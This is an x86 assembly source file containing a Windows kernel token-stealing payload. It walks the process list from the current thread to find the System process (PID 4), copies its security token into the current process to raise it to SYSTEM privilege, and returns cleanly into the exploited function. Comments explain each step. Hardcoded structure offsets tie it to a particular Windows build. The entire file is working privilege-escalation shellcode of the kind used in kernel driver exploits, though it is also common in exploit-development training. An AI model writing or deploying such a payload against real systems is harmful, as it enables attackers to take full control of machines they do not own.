.686
.model flat,stdcall
assume fs:nothing

.code
payload proc
	pushad
	; _KPCR -> _KPRCB -> _KTHREAD
	xor eax, eax
	mov eax, fs:[eax + 124h]

	; _KTHREAD -> _EPROCESS
	mov eax, [eax + 50h]

	; Save current process address and iterating to find a process running as system
	mov ebx, eax
	mov edx, 4

CheckOwner:
	; Iterate over each process through the ActiveProcessLinks linked list, checking the UniqueProcessId to look for PID 4 which always runs as system
	mov eax, [eax + 0b8h]
	; Each new instance starts at the ActiveProcessLinks member so you have to subtract to get the entire structure
	sub eax, 0b8h
	cmp [eax + 0b4h], edx
	jne CheckOwner

	; Copy system security token to current process to raise our privilege level
	mov ecx, [eax + 0f8h]
	mov [ebx + 0f8h], ecx

	; Cleanup the stack and return to the program (ret 8 is used since the funtion return address we utilized uses that so we can copy it to return code execution successfully)
	popad
	pop ebp
	ret 8
payload endp
end